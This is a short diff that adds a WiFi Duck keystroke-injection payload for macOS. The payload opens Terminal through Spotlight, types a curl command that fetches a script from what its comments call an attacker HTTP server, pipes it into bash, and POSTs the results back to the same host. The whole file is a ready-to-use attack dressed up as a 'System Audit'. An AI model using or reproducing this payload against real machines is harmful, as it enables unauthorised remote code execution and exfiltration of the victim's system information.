@@ -1,0 +1,21 @@
+// WiFi Duck Payload — macOS System Audit
+// Description: Opens Terminal via Spotlight and runs SysAudit_macos.sh
+//              from attacker HTTP server. Results POSTed back.
+// Target: macOS 12+
+// Author: <operator>
+
+delay 2000
+
+// Open Spotlight
+gui SPACE
+delay 800
+
+string Terminal
+delay 800
+enter
+delay 1500
+
+// Download and run, exfil results
+string curl -s http://172.16.84.1:8080/SysAudit_macos.sh | bash > /tmp/sa_out.txt 2>&1 && curl -s -X POST -d @/tmp/sa_out.txt http://172.16.84.1:8080/upload
+delay 200
+enter
